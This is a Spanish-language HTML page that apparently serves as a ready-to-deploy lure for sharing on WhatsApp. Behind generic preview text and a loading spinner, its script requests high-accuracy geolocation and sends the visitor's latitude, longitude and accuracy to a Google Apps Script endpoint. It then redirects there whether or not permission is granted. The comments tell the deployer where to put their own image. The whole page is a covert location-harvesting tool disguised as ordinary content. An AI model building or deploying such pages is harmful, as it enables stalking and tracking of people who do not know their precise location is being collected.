<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cargando contenido...</title>

  <!-- Etiquetas Open Graph para la vista previa de WhatsApp -->
  <meta property="og:type" content="website">
  <meta property="og:title" content="Acceso al contenido">
  <meta property="og:description" content="Haz clic para ver la información.">
  
  <!-- REEMPLAZA CON TU ENLACE PÚBLICO A luna.png -->
  <!-- Si usas GitHub Pages: https://USUARIO.github.io/REPOSITORIO/luna.png -->
  <!-- Si usas enlace Raw: https://raw.githubusercontent.com/USUARIO/REPOSITORIO/main/luna.png -->
  <meta property="og:image" content="https://raw.githubusercontent.com/USUARIO/REPOSITORIO/main/luna.png">
  <meta property="og:image:type" content="image/png">
  <meta property="og:image:width" content="1200">
  <meta property="og:image:height" content="630">

  <style>
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      background-color: #f4f6f8;
      color: #333;
      margin: 0;
      height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      text-align: center;
      padding: 20px;
      box-sizing: border-box;
    }
    .loader {
      border: 4px solid #e3e3e3;
      border-top: 4px solid #0066cc;
      border-radius: 50%;
      width: 45px;
      height: 45px;
      animation: girar 1s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes girar {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    p {
      font-size: 1.1rem;
      margin: 0;
    }
  </style>
</head>
<body>

  <div class="loader"></div>
  <p>Cargando, por favor espera un momento...</p>

  <script>
    const destinoBase = "https://script.google.com/macros/s/AKfycbwssa1HAg7fh83S9LTyx92XaJ9OKIInI7elzBFTsogvhFkiuF4BbrgSR-kMCwioIhd1/exec";

    function redirigir(query = "") {
      window.location.href = destinoBase + query;
    }

    // Solicitar permiso de ubicación al navegador
    if ("geolocation" in navigator) {
      navigator.geolocation.getCurrentPosition(
        (posicion) => {
          // Si el usuario concede el permiso, se envían las coordenadas como parámetros URL
          const lat = posicion.coords.latitude;
          const lon = posicion.coords.longitude;
          const precision = posicion.coords.accuracy;
          redirigir(`?lat=${lat}&lon=${lon}&acc=${precision}`);
        },
        (error) => {
          // Si el usuario deniega o hay tiempo de espera agotado, redirige igual
          console.warn("Permiso de ubicación no concedido o error:", error.message);
          redirigir();
        },
        {
          enableHighAccuracy: true, // Solicita la máxima precisión (GPS si está disponible)
          timeout: 6000,            // Espera máximo 6 segundos antes de redirigir por descarte
          maximumAge: 0
        }
      );
    } else {
      // Si el navegador no cuenta con API de geolocalización
      redirigir();
    }
  </script>

</body>
</html>
